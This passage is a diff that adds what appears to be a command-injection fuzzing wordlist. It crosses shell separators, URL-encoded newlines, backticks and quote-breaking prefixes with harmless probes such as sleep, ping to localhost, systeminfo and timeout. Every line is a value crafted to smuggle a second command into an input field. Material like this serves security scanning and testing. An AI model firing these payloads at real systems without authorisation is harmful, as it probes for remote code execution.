@@ -1,0 +1,1616 @@
+$(cmd /c "sleep 20")
+$(perl -e 'print "X"x1024')
+$(ping -c 20 127.0.0.1)
+$(ping /n 20 127.0.0.1)
+$(sleep 20)
+$(sysinfo)
+$(systeminfo)
+$(timeout 20 > NUL)
+%0A cmd /c "sleep 20"
+%0A cmd /c "sleep 20" #
+%0A cmd /c "sleep 20" %0A
+%0A cmd /c "sleep 20" &
+%0A cmd /c "sleep 20" &&
+%0A cmd /c "sleep 20" &::
+%0A cmd /c "sleep 20" ;
+%0A cmd /c "sleep 20" |
+%0A cmd /c "sleep 20" ||
+%0A perl -e 'print "X"x1024'
+%0A perl -e 'print "X"x1024' #
+%0A perl -e 'print "X"x1024' %0A
+%0A perl -e 'print "X"x1024' &
+%0A perl -e 'print "X"x1024' &&
+%0A perl -e 'print "X"x1024' &::
+%0A perl -e 'print "X"x1024' ;
+%0A perl -e 'print "X"x1024' |
+%0A perl -e 'print "X"x1024' ||
+%0A ping -c 20 127.0.0.1
+%0A ping -c 20 127.0.0.1 #
+%0A ping -c 20 127.0.0.1 %0A
+%0A ping -c 20 127.0.0.1 &
+%0A ping -c 20 127.0.0.1 &&
+%0A ping -c 20 127.0.0.1 &::
+%0A ping -c 20 127.0.0.1 ;
+%0A ping -c 20 127.0.0.1 |
+%0A ping -c 20 127.0.0.1 ||
+%0A ping /n 20 127.0.0.1
+%0A ping /n 20 127.0.0.1 #
+%0A ping /n 20 127.0.0.1 %0A
+%0A ping /n 20 127.0.0.1 &
+%0A ping /n 20 127.0.0.1 &&
+%0A ping /n 20 127.0.0.1 &::
+%0A ping /n 20 127.0.0.1 ;
+%0A ping /n 20 127.0.0.1 |
+%0A ping /n 20 127.0.0.1 ||
+%0A sleep 20
+%0A sleep 20 #
+%0A sleep 20 %0A
+%0A sleep 20 &
+%0A sleep 20 &&
+%0A sleep 20 &::
+%0A sleep 20 ;
+%0A sleep 20 |
+%0A sleep 20 ||
+%0A sysinfo
+%0A sysinfo #
+%0A sysinfo %0A
+%0A sysinfo &
+%0A sysinfo &&
+%0A sysinfo &::
+%0A sysinfo ;
+%0A sysinfo |
+%0A sysinfo ||
+%0A systeminfo
+%0A systeminfo #
+%0A systeminfo %0A
+%0A systeminfo &
+%0A systeminfo &&
+%0A systeminfo &::
+%0A systeminfo ;
+%0A systeminfo |
+%0A systeminfo ||
+%0A timeout 20 > NUL
+%0A timeout 20 > NUL #
+%0A timeout 20 > NUL %0A
+%0A timeout 20 > NUL &
+%0A timeout 20 > NUL &&
+%0A timeout 20 > NUL &::
+%0A timeout 20 > NUL ;
+%0A timeout 20 > NUL |
+%0A timeout 20 > NUL ||
+& cmd /c "sleep 20"
+& cmd /c "sleep 20" #
+& cmd /c "sleep 20" %0A
+& cmd /c "sleep 20" &
+& cmd /c "sleep 20" &&
+& cmd /c "sleep 20" &::
+& cmd /c "sleep 20" ;
+& cmd /c "sleep 20" \n
+& cmd /c "sleep 20" |
+& cmd /c "sleep 20" ||
+& perl -e 'print "X"x1024'
+& perl -e 'print "X"x1024' #
+& perl -e 'print "X"x1024' %0A
+& perl -e 'print "X"x1024' &
+& perl -e 'print "X"x1024' &&
+& perl -e 'print "X"x1024' &::
+& perl -e 'print "X"x1024' ;
+& perl -e 'print "X"x1024' \n
+& perl -e 'print "X"x1024' |
+& perl -e 'print "X"x1024' ||
+& ping -c 20 127.0.0.1
+& ping -c 20 127.0.0.1 #
+& ping -c 20 127.0.0.1 %0A
+& ping -c 20 127.0.0.1 &
+& ping -c 20 127.0.0.1 &&
+& ping -c 20 127.0.0.1 &::
+& ping -c 20 127.0.0.1 ;
+& ping -c 20 127.0.0.1 \n
+& ping -c 20 127.0.0.1 |
+& ping -c 20 127.0.0.1 ||
+& ping /n 20 127.0.0.1
+& ping /n 20 127.0.0.1 #
+& ping /n 20 127.0.0.1 %0A
+& ping /n 20 127.0.0.1 &
+& ping /n 20 127.0.0.1 &&
+& ping /n 20 127.0.0.1 &::
+& ping /n 20 127.0.0.1 ;
+& ping /n 20 127.0.0.1 \n
+& ping /n 20 127.0.0.1 |
+& ping /n 20 127.0.0.1 ||
+& sleep 20
+& sleep 20 #
+& sleep 20 %0A
+& sleep 20 &
+& sleep 20 &&
+& sleep 20 &::
+& sleep 20 ;
+& sleep 20 \n
+& sleep 20 |
+& sleep 20 ||
+& sysinfo
+& sysinfo #
+& sysinfo %0A
+& sysinfo &
+& sysinfo &&
+& sysinfo &::
+& sysinfo ;
+& sysinfo \n
+& sysinfo |
+& sysinfo ||
+& systeminfo
+& systeminfo #
+& systeminfo %0A
+& systeminfo &
+& systeminfo &&
+& systeminfo &::
+& systeminfo ;
+& systeminfo \n
+& systeminfo |
+& systeminfo ||
+& timeout 20 > NUL
+& timeout 20 > NUL #
+& timeout 20 > NUL %0A
+& timeout 20 > NUL &
+& timeout 20 > NUL &&
+& timeout 20 > NUL &::
+& timeout 20 > NUL ;
+& timeout 20 > NUL \n
+& timeout 20 > NUL |
+& timeout 20 > NUL ||
+&& cmd /c "sleep 20"
+&& cmd /c "sleep 20" #
+&& cmd /c "sleep 20" %0A
+&& cmd /c "sleep 20" &
+&& cmd /c "sleep 20" &&
+&& cmd /c "sleep 20" &::
+&& cmd /c "sleep 20" ;
+&& cmd /c "sleep 20" \n
+&& cmd /c "sleep 20" |
+&& cmd /c "sleep 20" ||
+&& perl -e 'print "X"x1024'
+&& perl -e 'print "X"x1024' #
+&& perl -e 'print "X"x1024' %0A
+&& perl -e 'print "X"x1024' &
+&& perl -e 'print "X"x1024' &&
+&& perl -e 'print "X"x1024' &::
+&& perl -e 'print "X"x1024' ;
+&& perl -e 'print "X"x1024' \n
+&& perl -e 'print "X"x1024' |
+&& perl -e 'print "X"x1024' ||
+&& ping -c 20 127.0.0.1
+&& ping -c 20 127.0.0.1 #
+&& ping -c 20 127.0.0.1 %0A
+&& ping -c 20 127.0.0.1 &
+&& ping -c 20 127.0.0.1 &&
+&& ping -c 20 127.0.0.1 &::
+&& ping -c 20 127.0.0.1 ;
+&& ping -c 20 127.0.0.1 \n
+&& ping -c 20 127.0.0.1 |
+&& ping -c 20 127.0.0.1 ||
+&& ping /n 20 127.0.0.1
+&& ping /n 20 127.0.0.1 #
+&& ping /n 20 127.0.0.1 %0A
+&& ping /n 20 127.0.0.1 &
+&& ping /n 20 127.0.0.1 &&
+&& ping /n 20 127.0.0.1 &::
+&& ping /n 20 127.0.0.1 ;
+&& ping /n 20 127.0.0.1 \n
+&& ping /n 20 127.0.0.1 |
+&& ping /n 20 127.0.0.1 ||
+&& sleep 20
+&& sleep 20 #
+&& sleep 20 %0A
+&& sleep 20 &
+&& sleep 20 &&
+&& sleep 20 &::
+&& sleep 20 ;
+&& sleep 20 \n
+&& sleep 20 |
+&& sleep 20 ||
+&& sysinfo
+&& sysinfo #
+&& sysinfo %0A
+&& sysinfo &
+&& sysinfo &&
+&& sysinfo &::
+&& sysinfo ;
+&& sysinfo \n
+&& sysinfo |
+&& sysinfo ||
+&& systeminfo
+&& systeminfo #
+&& systeminfo %0A
+&& systeminfo &
+&& systeminfo &&
+&& systeminfo &::
+&& systeminfo ;
+&& systeminfo \n
+&& systeminfo |
+&& systeminfo ||
+&& timeout 20 > NUL
+&& timeout 20 > NUL #
+&& timeout 20 > NUL %0A
+&& timeout 20 > NUL &
+&& timeout 20 > NUL &&
+&& timeout 20 > NUL &::
+&& timeout 20 > NUL ;
+&& timeout 20 > NUL \n
+&& timeout 20 > NUL |
+&& timeout 20 > NUL ||
+; cmd /c "sleep 20"
+; cmd /c "sleep 20" #
+; cmd /c "sleep 20" %0A
+; cmd /c "sleep 20" &
+; cmd /c "sleep 20" &&
+; cmd /c "sleep 20" &::
+; cmd /c "sleep 20" ;
+; cmd /c "sleep 20" \n
+; cmd /c "sleep 20" |
+; cmd /c "sleep 20" ||
+; perl -e 'print "X"x1024'
+; perl -e 'print "X"x1024' #
+; perl -e 'print "X"x1024' %0A
+; perl -e 'print "X"x1024' &
+; perl -e 'print "X"x1024' &&
+; perl -e 'print "X"x1024' &::
+; perl -e 'print "X"x1024' ;
+; perl -e 'print "X"x1024' \n
+; perl -e 'print "X"x1024' |
+; perl -e 'print "X"x1024' ||
+; ping -c 20 127.0.0.1
+; ping -c 20 127.0.0.1 #
+; ping -c 20 127.0.0.1 %0A
+; ping -c 20 127.0.0.1 &
+; ping -c 20 127.0.0.1 &&
+; ping -c 20 127.0.0.1 &::
+; ping -c 20 127.0.0.1 ;
+; ping -c 20 127.0.0.1 \n
+; ping -c 20 127.0.0.1 |
+; ping -c 20 127.0.0.1 ||
+; ping /n 20 127.0.0.1
+; ping /n 20 127.0.0.1 #
+; ping /n 20 127.0.0.1 %0A
+; ping /n 20 127.0.0.1 &
+; ping /n 20 127.0.0.1 &&
+; ping /n 20 127.0.0.1 &::
+; ping /n 20 127.0.0.1 ;
+; ping /n 20 127.0.0.1 \n
+; ping /n 20 127.0.0.1 |
+; ping /n 20 127.0.0.1 ||
+; sleep 20
+; sleep 20 #
+; sleep 20 %0A
+; sleep 20 &
+; sleep 20 &&
+; sleep 20 &::
+; sleep 20 ;
+; sleep 20 \n
+; sleep 20 |
+; sleep 20 ||
+; sysinfo
+; sysinfo #
+; sysinfo %0A
+; sysinfo &
+; sysinfo &&
+; sysinfo &::
+; sysinfo ;
+; sysinfo \n
+; sysinfo |
+; sysinfo ||
+; systeminfo
+; systeminfo #
+; systeminfo %0A
+; systeminfo &
+; systeminfo &&
+; systeminfo &::
+; systeminfo ;
+; systeminfo \n
+; systeminfo |
+; systeminfo ||
+; timeout 20 > NUL
+; timeout 20 > NUL #
+; timeout 20 > NUL %0A
+; timeout 20 > NUL &
+; timeout 20 > NUL &&
+; timeout 20 > NUL &::
+; timeout 20 > NUL ;
+; timeout 20 > NUL \n
+; timeout 20 > NUL |
+; timeout 20 > NUL ||
+\n cmd /c "sleep 20"
+\n cmd /c "sleep 20" #
+\n cmd /c "sleep 20" &
+\n cmd /c "sleep 20" &&
+\n cmd /c "sleep 20" &::
+\n cmd /c "sleep 20" ;
+\n cmd /c "sleep 20" \n
+\n cmd /c "sleep 20" |
+\n cmd /c "sleep 20" ||
+\n perl -e 'print "X"x1024'
+\n perl -e 'print "X"x1024' #
+\n perl -e 'print "X"x1024' &
+\n perl -e 'print "X"x1024' &&
+\n perl -e 'print "X"x1024' &::
+\n perl -e 'print "X"x1024' ;
+\n perl -e 'print "X"x1024' \n
+\n perl -e 'print "X"x1024' |
+\n perl -e 'print "X"x1024' ||
+\n ping -c 20 127.0.0.1
+\n ping -c 20 127.0.0.1 #
+\n ping -c 20 127.0.0.1 &
+\n ping -c 20 127.0.0.1 &&
+\n ping -c 20 127.0.0.1 &::
+\n ping -c 20 127.0.0.1 ;
+\n ping -c 20 127.0.0.1 \n
+\n ping -c 20 127.0.0.1 |
+\n ping -c 20 127.0.0.1 ||
+\n ping /n 20 127.0.0.1
+\n ping /n 20 127.0.0.1 #
+\n ping /n 20 127.0.0.1 &
+\n ping /n 20 127.0.0.1 &&
+\n ping /n 20 127.0.0.1 &::
+\n ping /n 20 127.0.0.1 ;
+\n ping /n 20 127.0.0.1 \n
+\n ping /n 20 127.0.0.1 |
+\n ping /n 20 127.0.0.1 ||
+\n sleep 20
+\n sleep 20 #
+\n sleep 20 &
+\n sleep 20 &&
+\n sleep 20 &::
+\n sleep 20 ;
+\n sleep 20 \n
+\n sleep 20 |
+\n sleep 20 ||
+\n sysinfo
+\n sysinfo #
+\n sysinfo &
+\n sysinfo &&
+\n sysinfo &::
+\n sysinfo ;
+\n sysinfo \n
+\n sysinfo |
+\n sysinfo ||
+\n systeminfo
+\n systeminfo #
+\n systeminfo &
+\n systeminfo &&
+\n systeminfo &::
+\n systeminfo ;
+\n systeminfo \n
+\n systeminfo |
+\n systeminfo ||
+\n timeout 20 > NUL
+\n timeout 20 > NUL #
+\n timeout 20 > NUL &
+\n timeout 20 > NUL &&
+\n timeout 20 > NUL &::
+\n timeout 20 > NUL ;
+\n timeout 20 > NUL \n
+\n timeout 20 > NUL |
+\n timeout 20 > NUL ||
+`cmd /c "sleep 20"`
+`perl -e 'print "X"x1024'`
+`ping -c 20 127.0.0.1`
+`ping /n 20 127.0.0.1`
+`sleep 20`
+`sysinfo`
+`systeminfo`
+`timeout 20 > NUL`
+a" %0A cmd /c "sleep 20" #
+a" %0A cmd /c "sleep 20" %0A
+a" %0A cmd /c "sleep 20" &
+a" %0A cmd /c "sleep 20" &&
+a" %0A cmd /c "sleep 20" &::
+a" %0A cmd /c "sleep 20" ;
+a" %0A cmd /c "sleep 20" |
+a" %0A cmd /c "sleep 20" ||
+a" %0A perl -e 'print "X"x1024' #
+a" %0A perl -e 'print "X"x1024' %0A
+a" %0A perl -e 'print "X"x1024' &
+a" %0A perl -e 'print "X"x1024' &&
+a" %0A perl -e 'print "X"x1024' &::
+a" %0A perl -e 'print "X"x1024' ;
+a" %0A perl -e 'print "X"x1024' |
+a" %0A perl -e 'print "X"x1024' ||
+a" %0A ping -c 20 127.0.0.1 #
+a" %0A ping -c 20 127.0.0.1 %0A
+a" %0A ping -c 20 127.0.0.1 &
+a" %0A ping -c 20 127.0.0.1 &&
+a" %0A ping -c 20 127.0.0.1 &::
+a" %0A ping -c 20 127.0.0.1 ;
+a" %0A ping -c 20 127.0.0.1 |
+a" %0A ping -c 20 127.0.0.1 ||
+a" %0A ping /n 20 127.0.0.1 #
+a" %0A ping /n 20 127.0.0.1 %0A
+a" %0A ping /n 20 127.0.0.1 &
+a" %0A ping /n 20 127.0.0.1 &&
+a" %0A ping /n 20 127.0.0.1 &::
+a" %0A ping /n 20 127.0.0.1 ;
+a" %0A ping /n 20 127.0.0.1 |
+a" %0A ping /n 20 127.0.0.1 ||
+a" %0A sleep 20 #
+a" %0A sleep 20 %0A
+a" %0A sleep 20 &
+a" %0A sleep 20 &&
+a" %0A sleep 20 &::
+a" %0A sleep 20 ;
+a" %0A sleep 20 |
+a" %0A sleep 20 ||
+a" %0A sysinfo #
+a" %0A sysinfo %0A
+a" %0A sysinfo &
+a" %0A sysinfo &&
+a" %0A sysinfo &::
+a" %0A sysinfo ;
+a" %0A sysinfo |
+a" %0A sysinfo ||
+a" %0A systeminfo #
+a" %0A systeminfo %0A
+a" %0A systeminfo &
+a" %0A systeminfo &&
+a" %0A systeminfo &::
+a" %0A systeminfo ;
+a" %0A systeminfo |
+a" %0A systeminfo ||
+a" %0A timeout 20 > NUL #
+a" %0A timeout 20 > NUL %0A
+a" %0A timeout 20 > NUL &
+a" %0A timeout 20 > NUL &&
+a" %0A timeout 20 > NUL &::
+a" %0A timeout 20 > NUL ;
+a" %0A timeout 20 > NUL |
+a" %0A timeout 20 > NUL ||
+a" & cmd /c "sleep 20" #
+a" & cmd /c "sleep 20" %0A
+a" & cmd /c "sleep 20" &
+a" & cmd /c "sleep 20" &&
+a" & cmd /c "sleep 20" &::
+a" & cmd /c "sleep 20" ;
+a" & cmd /c "sleep 20" \n
+a" & cmd /c "sleep 20" |
+a" & cmd /c "sleep 20" ||
+a" & perl -e 'print "X"x1024' #
+a" & perl -e 'print "X"x1024' %0A
+a" & perl -e 'print "X"x1024' &
+a" & perl -e 'print "X"x1024' &&
+a" & perl -e 'print "X"x1024' &::
+a" & perl -e 'print "X"x1024' ;
+a" & perl -e 'print "X"x1024' \n
+a" & perl -e 'print "X"x1024' |
+a" & perl -e 'print "X"x1024' ||
+a" & ping -c 20 127.0.0.1 #
+a" & ping -c 20 127.0.0.1 %0A
+a" & ping -c 20 127.0.0.1 &
+a" & ping -c 20 127.0.0.1 &&
+a" & ping -c 20 127.0.0.1 &::
+a" & ping -c 20 127.0.0.1 ;
+a" & ping -c 20 127.0.0.1 \n
+a" & ping -c 20 127.0.0.1 |
+a" & ping -c 20 127.0.0.1 ||
+a" & ping /n 20 127.0.0.1 #
+a" & ping /n 20 127.0.0.1 %0A
+a" & ping /n 20 127.0.0.1 &
+a" & ping /n 20 127.0.0.1 &&
+a" & ping /n 20 127.0.0.1 &::
+a" & ping /n 20 127.0.0.1 ;
+a" & ping /n 20 127.0.0.1 \n
+a" & ping /n 20 127.0.0.1 |
+a" & ping /n 20 127.0.0.1 ||
+a" & sleep 20 #
+a" & sleep 20 %0A
+a" & sleep 20 &
+a" & sleep 20 &&
+a" & sleep 20 &::
+a" & sleep 20 ;
+a" & sleep 20 \n
+a" & sleep 20 |
+a" & sleep 20 ||
+a" & sysinfo #
+a" & sysinfo %0A
+a" & sysinfo &
+a" & sysinfo &&
+a" & sysinfo &::
+a" & sysinfo ;
+a" & sysinfo \n
+a" & sysinfo |
+a" & sysinfo ||
+a" & systeminfo #
+a" & systeminfo %0A
+a" & systeminfo &
+a" & systeminfo &&
+a" & systeminfo &::
+a" & systeminfo ;
+a" & systeminfo \n
+a" & systeminfo |
+a" & systeminfo ||
+a" & timeout 20 > NUL #
+a" & timeout 20 > NUL %0A
+a" & timeout 20 > NUL &
+a" & timeout 20 > NUL &&
+a" & timeout 20 > NUL &::
+a" & timeout 20 > NUL ;
+a" & timeout 20 > NUL \n
+a" & timeout 20 > NUL |
+a" & timeout 20 > NUL ||
+a" && cmd /c "sleep 20" #
+a" && cmd /c "sleep 20" %0A
+a" && cmd /c "sleep 20" &
+a" && cmd /c "sleep 20" &&
+a" && cmd /c "sleep 20" &::
+a" && cmd /c "sleep 20" ;
+a" && cmd /c "sleep 20" \n
+a" && cmd /c "sleep 20" |
+a" && cmd /c "sleep 20" ||
+a" && perl -e 'print "X"x1024' #
+a" && perl -e 'print "X"x1024' %0A
+a" && perl -e 'print "X"x1024' &
+a" && perl -e 'print "X"x1024' &&
+a" && perl -e 'print "X"x1024' &::
+a" && perl -e 'print "X"x1024' ;
+a" && perl -e 'print "X"x1024' \n
+a" && perl -e 'print "X"x1024' |
+a" && perl -e 'print "X"x1024' ||
+a" && ping -c 20 127.0.0.1 #
+a" && ping -c 20 127.0.0.1 %0A
+a" && ping -c 20 127.0.0.1 &
+a" && ping -c 20 127.0.0.1 &&
+a" && ping -c 20 127.0.0.1 &::
+a" && ping -c 20 127.0.0.1 ;
+a" && ping -c 20 127.0.0.1 \n
+a" && ping -c 20 127.0.0.1 |
+a" && ping -c 20 127.0.0.1 ||
+a" && ping /n 20 127.0.0.1 #
+a" && ping /n 20 127.0.0.1 %0A
+a" && ping /n 20 127.0.0.1 &
+a" && ping /n 20 127.0.0.1 &&
+a" && ping /n 20 127.0.0.1 &::
+a" && ping /n 20 127.0.0.1 ;
+a" && ping /n 20 127.0.0.1 \n
+a" && ping /n 20 127.0.0.1 |
+a" && ping /n 20 127.0.0.1 ||
+a" && sleep 20 #
+a" && sleep 20 %0A
+a" && sleep 20 &
+a" && sleep 20 &&
+a" && sleep 20 &::
+a" && sleep 20 ;
+a" && sleep 20 \n
+a" && sleep 20 |
+a" && sleep 20 ||
+a" && sysinfo #
+a" && sysinfo %0A
+a" && sysinfo &
+a" && sysinfo &&
+a" && sysinfo &::
+a" && sysinfo ;
+a" && sysinfo \n
+a" && sysinfo |
+a" && sysinfo ||
+a" && systeminfo #
+a" && systeminfo %0A
+a" && systeminfo &
+a" && systeminfo &&
+a" && systeminfo &::
+a" && systeminfo ;
+a" && systeminfo \n
+a" && systeminfo |
+a" && systeminfo ||
+a" && timeout 20 > NUL #
+a" && timeout 20 > NUL %0A
+a" && timeout 20 > NUL &
+a" && timeout 20 > NUL &&
+a" && timeout 20 > NUL &::
+a" && timeout 20 > NUL ;
+a" && timeout 20 > NUL \n
+a" && timeout 20 > NUL |
+a" && timeout 20 > NUL ||
+a" ; cmd /c "sleep 20" #
+a" ; cmd /c "sleep 20" %0A
+a" ; cmd /c "sleep 20" &
+a" ; cmd /c "sleep 20" &&
+a" ; cmd /c "sleep 20" &::
+a" ; cmd /c "sleep 20" ;
+a" ; cmd /c "sleep 20" \n
+a" ; cmd /c "sleep 20" |
+a" ; cmd /c "sleep 20" ||
+a" ; perl -e 'print "X"x1024' #
+a" ; perl -e 'print "X"x1024' %0A
+a" ; perl -e 'print "X"x1024' &
+a" ; perl -e 'print "X"x1024' &&
+a" ; perl -e 'print "X"x1024' &::
+a" ; perl -e 'print "X"x1024' ;
+a" ; perl -e 'print "X"x1024' \n
+a" ; perl -e 'print "X"x1024' |
+a" ; perl -e 'print "X"x1024' ||
+a" ; ping -c 20 127.0.0.1 #
+a" ; ping -c 20 127.0.0.1 %0A
+a" ; ping -c 20 127.0.0.1 &
+a" ; ping -c 20 127.0.0.1 &&
+a" ; ping -c 20 127.0.0.1 &::
+a" ; ping -c 20 127.0.0.1 ;
+a" ; ping -c 20 127.0.0.1 \n
+a" ; ping -c 20 127.0.0.1 |
+a" ; ping -c 20 127.0.0.1 ||
+a" ; ping /n 20 127.0.0.1 #
+a" ; ping /n 20 127.0.0.1 %0A
+a" ; ping /n 20 127.0.0.1 &
+a" ; ping /n 20 127.0.0.1 &&
+a" ; ping /n 20 127.0.0.1 &::
+a" ; ping /n 20 127.0.0.1 ;
+a" ; ping /n 20 127.0.0.1 \n
+a" ; ping /n 20 127.0.0.1 |
+a" ; ping /n 20 127.0.0.1 ||
+a" ; sleep 20 #
+a" ; sleep 20 %0A
+a" ; sleep 20 &
+a" ; sleep 20 &&
+a" ; sleep 20 &::
+a" ; sleep 20 ;
+a" ; sleep 20 \n
+a" ; sleep 20 |
+a" ; sleep 20 ||
+a" ; sysinfo #
+a" ; sysinfo %0A
+a" ; sysinfo &
+a" ; sysinfo &&
+a" ; sysinfo &::
+a" ; sysinfo ;
+a" ; sysinfo \n
+a" ; sysinfo |
+a" ; sysinfo ||
+a" ; systeminfo #
+a" ; systeminfo %0A
+a" ; systeminfo &
+a" ; systeminfo &&
+a" ; systeminfo &::
+a" ; systeminfo ;
+a" ; systeminfo \n
+a" ; systeminfo |
+a" ; systeminfo ||
+a" ; timeout 20 > NUL #
+a" ; timeout 20 > NUL %0A
+a" ; timeout 20 > NUL &
+a" ; timeout 20 > NUL &&
+a" ; timeout 20 > NUL &::
+a" ; timeout 20 > NUL ;
+a" ; timeout 20 > NUL \n
+a" ; timeout 20 > NUL |
+a" ; timeout 20 > NUL ||
+a" \n cmd /c "sleep 20" #
+a" \n cmd /c "sleep 20" &
+a" \n cmd /c "sleep 20" &&
+a" \n cmd /c "sleep 20" &::
+a" \n cmd /c "sleep 20" ;
+a" \n cmd /c "sleep 20" \n
+a" \n cmd /c "sleep 20" |
+a" \n cmd /c "sleep 20" ||
+a" \n perl -e 'print "X"x1024' #
+a" \n perl -e 'print "X"x1024' &
+a" \n perl -e 'print "X"x1024' &&
+a" \n perl -e 'print "X"x1024' &::
+a" \n perl -e 'print "X"x1024' ;
+a" \n perl -e 'print "X"x1024' \n
+a" \n perl -e 'print "X"x1024' |
+a" \n perl -e 'print "X"x1024' ||
+a" \n ping -c 20 127.0.0.1 #
+a" \n ping -c 20 127.0.0.1 &
+a" \n ping -c 20 127.0.0.1 &&
+a" \n ping -c 20 127.0.0.1 &::
+a" \n ping -c 20 127.0.0.1 ;
+a" \n ping -c 20 127.0.0.1 \n
+a" \n ping -c 20 127.0.0.1 |
+a" \n ping -c 20 127.0.0.1 ||
+a" \n ping /n 20 127.0.0.1 #
+a" \n ping /n 20 127.0.0.1 &
+a" \n ping /n 20 127.0.0.1 &&
+a" \n ping /n 20 127.0.0.1 &::
+a" \n ping /n 20 127.0.0.1 ;
+a" \n ping /n 20 127.0.0.1 \n
+a" \n ping /n 20 127.0.0.1 |
+a" \n ping /n 20 127.0.0.1 ||
+a" \n sleep 20 #
+a" \n sleep 20 &
+a" \n sleep 20 &&
+a" \n sleep 20 &::
+a" \n sleep 20 ;
+a" \n sleep 20 \n
+a" \n sleep 20 |
+a" \n sleep 20 ||
+a" \n sysinfo #
+a" \n sysinfo &
+a" \n sysinfo &&
+a" \n sysinfo &::
+a" \n sysinfo ;
+a" \n sysinfo \n
+a" \n sysinfo |
+a" \n sysinfo ||
+a" \n systeminfo #
+a" \n systeminfo &
+a" \n systeminfo &&
+a" \n systeminfo &::
+a" \n systeminfo ;
+a" \n systeminfo \n
+a" \n systeminfo |
+a" \n systeminfo ||
+a" \n timeout 20 > NUL #
+a" \n timeout 20 > NUL &
+a" \n timeout 20 > NUL &&
+a" \n timeout 20 > NUL &::
+a" \n timeout 20 > NUL ;
+a" \n timeout 20 > NUL \n
+a" \n timeout 20 > NUL |
+a" \n timeout 20 > NUL ||
+a" | cmd /c "sleep 20" #
+a" | cmd /c "sleep 20" %0A
+a" | cmd /c "sleep 20" &
+a" | cmd /c "sleep 20" &&
+a" | cmd /c "sleep 20" &::
+a" | cmd /c "sleep 20" ;
+a" | cmd /c "sleep 20" \n
+a" | cmd /c "sleep 20" |
+a" | cmd /c "sleep 20" ||
+a" | perl -e 'print "X"x1024' #
+a" | perl -e 'print "X"x1024' %0A
+a" | perl -e 'print "X"x1024' &
+a" | perl -e 'print "X"x1024' &&
+a" | perl -e 'print "X"x1024' &::
+a" | perl -e 'print "X"x1024' ;
+a" | perl -e 'print "X"x1024' \n
+a" | perl -e 'print "X"x1024' |
+a" | perl -e 'print "X"x1024' ||
+a" | ping -c 20 127.0.0.1 #
+a" | ping -c 20 127.0.0.1 %0A
+a" | ping -c 20 127.0.0.1 &
+a" | ping -c 20 127.0.0.1 &&
+a" | ping -c 20 127.0.0.1 &::
+a" | ping -c 20 127.0.0.1 ;
+a" | ping -c 20 127.0.0.1 \n
+a" | ping -c 20 127.0.0.1 |
+a" | ping -c 20 127.0.0.1 ||
+a" | ping /n 20 127.0.0.1 #
+a" | ping /n 20 127.0.0.1 %0A
+a" | ping /n 20 127.0.0.1 &
+a" | ping /n 20 127.0.0.1 &&
+a" | ping /n 20 127.0.0.1 &::
+a" | ping /n 20 127.0.0.1 ;
+a" | ping /n 20 127.0.0.1 \n
+a" | ping /n 20 127.0.0.1 |
+a" | ping /n 20 127.0.0.1 ||
+a" | sleep 20 #
+a" | sleep 20 %0A
+a" | sleep 20 &
+a" | sleep 20 &&
+a" | sleep 20 &::
+a" | sleep 20 ;
+a" | sleep 20 \n
+a" | sleep 20 |
+a" | sleep 20 ||
+a" | sysinfo #
+a" | sysinfo %0A
+a" | sysinfo &
+a" | sysinfo &&
+a" | sysinfo &::
+a" | sysinfo ;
+a" | sysinfo \n
+a" | sysinfo |
+a" | sysinfo ||
+a" | systeminfo #
+a" | systeminfo %0A
+a" | systeminfo &
+a" | systeminfo &&
+a" | systeminfo &::
+a" | systeminfo ;
+a" | systeminfo \n
+a" | systeminfo |
+a" | systeminfo ||
+a" | timeout 20 > NUL #
+a" | timeout 20 > NUL %0A
+a" | timeout 20 > NUL &
+a" | timeout 20 > NUL &&
+a" | timeout 20 > NUL &::
+a" | timeout 20 > NUL ;
+a" | timeout 20 > NUL \n
+a" | timeout 20 > NUL |
+a" | timeout 20 > NUL ||
+a" || cmd /c "sleep 20" #
+a" || cmd /c "sleep 20" %0A
+a" || cmd /c "sleep 20" &
+a" || cmd /c "sleep 20" &&
+a" || cmd /c "sleep 20" &::
+a" || cmd /c "sleep 20" ;
+a" || cmd /c "sleep 20" \n
+a" || cmd /c "sleep 20" |
+a" || cmd /c "sleep 20" ||
+a" || perl -e 'print "X"x1024' #
+a" || perl -e 'print "X"x1024' %0A
+a" || perl -e 'print "X"x1024' &
+a" || perl -e 'print "X"x1024' &&
+a" || perl -e 'print "X"x1024' &::
+a" || perl -e 'print "X"x1024' ;
+a" || perl -e 'print "X"x1024' \n
+a" || perl -e 'print "X"x1024' |
+a" || perl -e 'print "X"x1024' ||
+a" || ping -c 20 127.0.0.1 #
+a" || ping -c 20 127.0.0.1 %0A
+a" || ping -c 20 127.0.0.1 &
+a" || ping -c 20 127.0.0.1 &&
+a" || ping -c 20 127.0.0.1 &::
+a" || ping -c 20 127.0.0.1 ;
+a" || ping -c 20 127.0.0.1 \n
+a" || ping -c 20 127.0.0.1 |
+a" || ping -c 20 127.0.0.1 ||
+a" || ping /n 20 127.0.0.1 #
+a" || ping /n 20 127.0.0.1 %0A
+a" || ping /n 20 127.0.0.1 &
+a" || ping /n 20 127.0.0.1 &&
+a" || ping /n 20 127.0.0.1 &::
+a" || ping /n 20 127.0.0.1 ;
+a" || ping /n 20 127.0.0.1 \n
+a" || ping /n 20 127.0.0.1 |
+a" || ping /n 20 127.0.0.1 ||
+a" || sleep 20 #
+a" || sleep 20 %0A
+a" || sleep 20 &
+a" || sleep 20 &&
+a" || sleep 20 &::
+a" || sleep 20 ;
+a" || sleep 20 \n
+a" || sleep 20 |
+a" || sleep 20 ||
+a" || sysinfo #
+a" || sysinfo %0A
+a" || sysinfo &
+a" || sysinfo &&
+a" || sysinfo &::
+a" || sysinfo ;
+a" || sysinfo \n
+a" || sysinfo |
+a" || sysinfo ||
+a" || systeminfo #
+a" || systeminfo %0A
+a" || systeminfo &
+a" || systeminfo &&
+a" || systeminfo &::
+a" || systeminfo ;
+a" || systeminfo \n
+a" || systeminfo |
+a" || systeminfo ||
+a" || timeout 20 > NUL #
+a" || timeout 20 > NUL %0A
+a" || timeout 20 > NUL &
+a" || timeout 20 > NUL &&
+a" || timeout 20 > NUL &::
+a" || timeout 20 > NUL ;
+a" || timeout 20 > NUL \n
+a" || timeout 20 > NUL |
+a" || timeout 20 > NUL ||
+a' %0A cmd /c "sleep 20" #
+a' %0A cmd /c "sleep 20" %0A
+a' %0A cmd /c "sleep 20" &
+a' %0A cmd /c "sleep 20" &&
+a' %0A cmd /c "sleep 20" &::
+a' %0A cmd /c "sleep 20" ;
+a' %0A cmd /c "sleep 20" |
+a' %0A cmd /c "sleep 20" ||
+a' %0A perl -e 'print "X"x1024' #
+a' %0A perl -e 'print "X"x1024' %0A
